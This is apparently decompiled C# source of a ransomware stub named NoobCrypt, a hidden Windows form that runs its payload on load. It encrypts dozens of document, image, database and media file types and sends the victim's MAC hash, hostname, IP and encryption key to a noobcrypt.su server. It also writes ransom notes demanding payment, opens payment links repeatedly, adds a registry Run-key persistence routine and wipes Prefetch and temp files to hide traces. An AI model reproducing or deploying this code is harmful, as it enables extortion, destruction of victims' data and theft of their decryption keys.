using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using stub.FileEncrypter;
using stub.My;

namespace stub;

[DesignerGenerated]
public class Form1 : Form
{
	private string[] UsableChars;

	private Random RandomClass;

	private object CharsList;

	private string Fp;

	private string Fp2;

	private int Number;

	private IContainer components;

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		RandomClass = new Random();
		CharsList = "A,B,C,D,E,F,G,H,J,K,a,b,c,d,e,f,g,h,j,k,1,2,3,4,5,6,7,8,9,0";
		Fp = "";
		Fp2 = "";
		Number = 0;
		InitializeComponent();
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void ClearTrace()
	{
		try
		{
			string[] files = Directory.GetFiles("C:\\Windows\\Prefetch\\", "NoobCrypt", SearchOption.AllDirectories);
			foreach (string text in files)
			{
				FileSystem.Kill(text);
			}
		}
		catch (UnauthorizedAccessException projectError)
		{
			ProjectData.SetProjectError((Exception)projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			string[] files2 = Directory.GetFiles("C:\\Windows\\Prefetch\\", "MBR*", SearchOption.AllDirectories);
			foreach (string text2 in files2)
			{
				FileSystem.Kill(text2);
			}
		}
		catch (UnauthorizedAccessException projectError2)
		{
			ProjectData.SetProjectError((Exception)projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			string[] files3 = Directory.GetFiles("C:\\Windows\\Prefetch\\", "UNINSTALL*", SearchOption.AllDirectories);
			foreach (string text3 in files3)
			{
				FileSystem.Kill(text3);
			}
		}
		catch (UnauthorizedAccessException projectError3)
		{
			ProjectData.SetProjectError((Exception)projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			string[] files4 = Directory.GetFiles("C:\\Windows\\Prefetch\\", "README*", SearchOption.AllDirectories);
			foreach (string text4 in files4)
			{
				FileSystem.Kill(text4);
			}
		}
		catch (UnauthorizedAccessException projectError4)
		{
			ProjectData.SetProjectError((Exception)projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			string[] files5 = Directory.GetFiles("C:\\Windows\\Prefetch\\", "WEVTUTIL*", SearchOption.AllDirectories);
			foreach (string text5 in files5)
			{
				FileSystem.Kill(text5);
			}
		}
		catch (UnauthorizedAccessException projectError5)
		{
			ProjectData.SetProjectError((Exception)projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			string[] files6 = Directory.GetFiles("C:\\Windows\\Prefetch\\", "DLLHOST*", SearchOption.AllDirectories);
			foreach (string text6 in files6)
			{
				FileSystem.Kill(text6);
			}
		}
		catch (UnauthorizedAccessException projectError6)
		{
			ProjectData.SetProjectError((Exception)projectError6);
			ProjectData.ClearProjectError();
		}
		try
		{
			string[] files7 = Directory.GetFiles("C:\\Windows\\Prefetch\\", "REG*", SearchOption.AllDirectories);
			foreach (string text7 in files7)
			{
				FileSystem.Kill(text7);
			}
		}
		catch (UnauthorizedAccessException projectError7)
		{
			ProjectData.SetProjectError((Exception)projectError7);
			ProjectData.ClearProjectError();
		}
		try
		{
			string[] files8 = Directory.GetFiles("C:\\Windows\\Prefetch\\", "SESSION*", SearchOption.AllDirectories);
			foreach (string text8 in files8)
			{
				FileSystem.Kill(text8);
			}
		}
		catch (UnauthorizedAccessException projectError8)
		{
			ProjectData.SetProjectError((Exception)projectError8);
			ProjectData.ClearProjectError();
		}
		try
		{
			string[] files9 = Directory.GetFiles("C:\\Windows\\Prefetch\\", "RUNDLL*", SearchOption.AllDirectories);
			foreach (string text9 in files9)
			{
				FileSystem.Kill(text9);
			}
		}
		catch (UnauthorizedAccessException projectError9)
		{
			ProjectData.SetProjectError((Exception)projectError9);
			ProjectData.ClearProjectError();
		}
		try
		{
			string[] files10 = Directory.GetFiles("C:\\Windows\\Prefetch\\", "CONSENT*", SearchOption.AllDirectories);
			foreach (string text10 in files10)
			{
				FileSystem.Kill(text10);
			}
		}
		catch (UnauthorizedAccessException projectError10)
		{
			ProjectData.SetProjectError((Exception)projectError10);
			ProjectData.ClearProjectError();
		}
		try
		{
			string[] files11 = Directory.GetFiles("C:\\Windows\\Prefetch\\", "stub*", SearchOption.AllDirectories);
			foreach (string text11 in files11)
			{
				FileSystem.Kill(text11);
			}
		}
		catch (UnauthorizedAccessException projectError11)
		{
			ProjectData.SetProjectError((Exception)projectError11);
			ProjectData.ClearProjectError();
		}
		try
		{
			string[] files12 = Directory.GetFiles("C:\\Windows\\Prefetch\\", "BOOTMGR*", SearchOption.AllDirectories);
			foreach (string text12 in files12)
			{
				FileSystem.Kill(text12);
			}
		}
		catch (UnauthorizedAccessException projectError12)
		{
			ProjectData.SetProjectError((Exception)projectError12);
			ProjectData.ClearProjectError();
		}
		try
		{
			string[] files13 = Directory.GetFiles("C:\\Windows\\Prefetch\\", "WUAPIHOST*", SearchOption.AllDirectories);
			foreach (string text13 in files13)
			{
				FileSystem.Kill(text13);
			}
		}
		catch (UnauthorizedAccessException projectError13)
		{
			ProjectData.SetProjectError((Exception)projectError13);
			ProjectData.ClearProjectError();
		}
		try
		{
			string[] files14 = Directory.GetFiles("C:\\Windows\\Prefetch\\", "CMD*", SearchOption.AllDirectories);
			foreach (string text14 in files14)
			{
				FileSystem.Kill(text14);
			}
		}
		catch (UnauthorizedAccessException projectError14)
		{
			ProjectData.SetProjectError((Exception)projectError14);
			ProjectData.ClearProjectError();
		}
		string tempPath = Path.GetTempPath();
		FileInfo[] files15 = new DirectoryInfo(tempPath).GetFiles("*.*");
		foreach (FileInfo fileInfo in files15)
		{
			try
			{
				fileInfo.Delete();
			}
			catch (Exception projectError15)
			{
				ProjectData.SetProjectError(projectError15);
				ProjectData.ClearProjectError();
			}
		}
		Thread.Sleep(100);
	}

	public object getMacAddress()
	{
		NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
		return allNetworkInterfaces[0].GetPhysicalAddress().ToString();
	}

	public void RunAtStartup(string ApplicationName, string ApplicationPath)
	{
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
		RegistryKey registryKey2 = registryKey;
		registryKey2.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey2.SetValue(ApplicationName, ApplicationPath);
		registryKey2 = null;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		byte[] array = (byte[])NewLateBinding.LateGet((object)SHA1.Create(), (Type)null, "ComputeHash", new object[1] { NewLateBinding.LateGet((object)Encoding.UTF8, (Type)null, "GetBytes", new object[1] { getMacAddress() }, (string[])null, (Type[])null, (bool[])null) }, (string[])null, (Type[])null, (bool[])null);
		StringBuilder stringBuilder = new StringBuilder();
		checked
		{
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				stringBuilder.Append(array[i].ToString("x2"));
			}
			string hostName = Dns.GetHostName();
			object obj = null;
			IPAddress[] addressList = Dns.GetHostEntry(hostName).AddressList;
			foreach (IPAddress iPAddress in addressList)
			{
				obj = iPAddress.ToString();
			}
			string text = stub.FileEncrypter.FileEncrypter.EncryptFiles("txt", "doc", "dot", "docx", "docm", "dotx", "dotm", "docb", "rtf", "wpd", "pdf", "xls", "xlt", "xlm", "xlsx", "xlsm", "xltx", "xltm", "xlsb", "cdx", "xla", "xlam", "xll", "xlw", "ppt", "pot", "pps", "pptx", "pptm", "potx", "potm", "ppam", "ppsx", "ppsm", "sldx", "sldm", "accdb", "db", "dbf", "mdb", "pdb", "sql", "jpg", "jpeg", "raw", "tif", "gif", "png", "bmp", "wav", "mp3", "aif", "iff", "m3u", "m4u", "mid", "mpa", "wma", "ra", "avi", "mov", "mp4", "3gp", "3g2", "asf", "asx", "flv", "wmv", "vob", "m3u8", "ico");
			WebClientEx webClientEx = new WebClientEx();
			webClientEx.DownloadString("http://noobcrypt.su/api/6722962453be7aede7b844be3275f57e7a086ceb/" + stringBuilder.ToString() + "?hostname=" + hostName.ToString() + "&ip=" + obj.ToString() + "&encryptionkey=" + text);
			StreamWriter streamWriter = ((ServerComputer)MyProject.Computer).get_FileSystem().OpenTextFileWriter("@README_CRYPTED_PC@.txt", true);
			streamWriter.WriteLine("Your files has been crypted!");
			streamWriter.WriteLine("All of your files are encrypted with RSA-2048 and AES-128 ciphers.");
			streamWriter.WriteLine("");
			streamWriter.WriteLine("\r\nDecrypting of your files is only possible with the private key and decrypt program, which is on our secret server.\r\n");
			streamWriter.WriteLine("");
			streamWriter.WriteLine("");
			streamWriter.WriteLine("In order to recive your files back, you have to pay a RANSOM and get a LICENSE which you will use in our DECRYPTOR to get your files back!");
			streamWriter.WriteLine("In order to PAY visit the link down below!");
			streamWriter.WriteLine("");
			streamWriter.WriteLine("https://noobcrypt.su/api/payment/6722962453be7aede7b844be3275f57e7a086ceb/" + stringBuilder.ToString());
			streamWriter.WriteLine("https://noobcrypt.su/api/payment/6722962453be7aede7b844be3275f57e7a086ceb/" + stringBuilder.ToString());
			streamWriter.WriteLine("https://noobcrypt.su/api/payment/6722962453be7aede7b844be3275f57e7a086ceb/" + stringBuilder.ToString());
			streamWriter.WriteLine("https://noobcrypt.su/api/payment/6722962453be7aede7b844be3275f57e7a086ceb/" + stringBuilder.ToString());
			streamWriter.WriteLine("https://noobcrypt.su/api/payment/6722962453be7aede7b844be3275f57e7a086ceb/" + stringBuilder.ToString());
			streamWriter.Close();
			StreamWriter streamWriter2 = ((ServerComputer)MyProject.Computer).get_FileSystem().OpenTextFileWriter("@README_CRYPTED_PC@2.txt", true);
			streamWriter2.WriteLine("Your files has been crypted!");
			streamWriter2.WriteLine("All of your files are encrypted with RSA-2048 and AES-128 ciphers.");
			streamWriter2.WriteLine("");
			streamWriter2.WriteLine("\r\nDecrypting of your files is only possible with the private key and decrypt program, which is on our secret server.\r\n");
			streamWriter2.WriteLine("");
			streamWriter2.WriteLine("");
			streamWriter2.WriteLine("In order to recive your files back, you have to pay a RANSOM and get a LICENSE which you will use in our DECRYPTOR to get your files back!");
			streamWriter2.WriteLine("In order to PAY visit the link down below!");
			streamWriter2.WriteLine("");
			streamWriter2.WriteLine("https://noobcrypt.su/api/payment/6722962453be7aede7b844be3275f57e7a086ceb/" + stringBuilder.ToString());
			streamWriter2.WriteLine("https://noobcrypt.su/api/payment/6722962453be7aede7b844be3275f57e7a086ceb/" + stringBuilder.ToString());
			streamWriter2.WriteLine("https://noobcrypt.su/api/payment/6722962453be7aede7b844be3275f57e7a086ceb/" + stringBuilder.ToString());
			streamWriter2.WriteLine("https://noobcrypt.su/api/payment/6722962453be7aede7b844be3275f57e7a086ceb/" + stringBuilder.ToString());
			streamWriter2.WriteLine("https://noobcrypt.su/api/payment/6722962453be7aede7b844be3275f57e7a086ceb/" + stringBuilder.ToString());
			streamWriter2.Close();
			StreamWriter streamWriter3 = ((ServerComputer)MyProject.Computer).get_FileSystem().OpenTextFileWriter("@README_CRYPTED_PC@4.txt", true);
			streamWriter3.WriteLine("Your files has been crypted!");
			streamWriter3.WriteLine("All of your files are encrypted with RSA-2048 and AES-128 ciphers.");
			streamWriter3.WriteLine("");
			streamWriter3.WriteLine("\r\nDecrypting of your files is only possible with the private key and decrypt program, which is on our secret server.\r\n");
			streamWriter3.WriteLine("");
			streamWriter3.WriteLine("");
			streamWriter3.WriteLine("In order to recive your files back, you have to pay a RANSOM and get a LICENSE which you will use in our DECRYPTOR to get your files back!");
			streamWriter3.WriteLine("In order to PAY visit the link down below!");
			streamWriter3.WriteLine("");
			streamWriter3.WriteLine("https://noobcrypt.su/api/payment/6722962453be7aede7b844be3275f57e7a086ceb/" + stringBuilder.ToString());
			streamWriter3.WriteLine("https://noobcrypt.su/api/payment/6722962453be7aede7b844be3275f57e7a086ceb/" + stringBuilder.ToString());
			streamWriter3.WriteLine("https://noobcrypt.su/api/payment/6722962453be7aede7b844be3275f57e7a086ceb/" + stringBuilder.ToString());
			streamWriter3.WriteLine("https://noobcrypt.su/api/payment/6722962453be7aede7b844be3275f57e7a086ceb/" + stringBuilder.ToString());
			streamWriter3.WriteLine("https://noobcrypt.su/api/payment/6722962453be7aede7b844be3275f57e7a086ceb/" + stringBuilder.ToString());
			streamWriter3.Close();
			StreamWriter streamWriter4 = ((ServerComputer)MyProject.Computer).get_FileSystem().OpenTextFileWriter("@README_CRYPTED_PC@3.txt", true);
			streamWriter4.WriteLine("Your files has been crypted!");
			streamWriter4.WriteLine("All of your files are encrypted with RSA-2048 and AES-128 ciphers.");
			streamWriter4.WriteLine("");
			streamWriter4.WriteLine("\r\nDecrypting of your files is only possible with the private key and decrypt program, which is on our secret server.\r\n");
			streamWriter4.WriteLine("");
			streamWriter4.WriteLine("");
			streamWriter4.WriteLine("In order to recive your files back, you have to pay a RANSOM and get a LICENSE which you will use in our DECRYPTOR to get your files back!");
			streamWriter4.WriteLine("In order to PAY visit the link down below!");
			streamWriter4.WriteLine("");
			streamWriter4.WriteLine("https://noobcrypt.su/api/payment/6722962453be7aede7b844be3275f57e7a086ceb/" + stringBuilder.ToString());
			streamWriter4.WriteLine("https://noobcrypt.su/api/payment/6722962453be7aede7b844be3275f57e7a086ceb/" + stringBuilder.ToString());
			streamWriter4.WriteLine("https://noobcrypt.su/api/payment/6722962453be7aede7b844be3275f57e7a086ceb/" + stringBuilder.ToString());
			streamWriter4.WriteLine("https://noobcrypt.su/api/payment/6722962453be7aede7b844be3275f57e7a086ceb/" + stringBuilder.ToString());
			streamWriter4.WriteLine("https://noobcrypt.su/api/payment/6722962453be7aede7b844be3275f57e7a086ceb/" + stringBuilder.ToString());
			streamWriter4.Close();
			string fileName = "https://noobcrypt.su/api/payment/6722962453be7aede7b844be3275f57e7a086ceb/" + stringBuilder.ToString();
			Process.Start(fileName);
			Process.Start(fileName);
			Process.Start(fileName);
			Process.Start(fileName);
			Process.Start(fileName);
			Process.Start(fileName);
			Process.Start(fileName);
			Process.Start(fileName);
			Process.Start(fileName);
			Process.Start(fileName);
			Process.Start(fileName);
			Process.Start(fileName);
			ClearTrace();
			ProjectData.EndApp();
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(10, 10));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).ResumeLayout(false);
	}
}
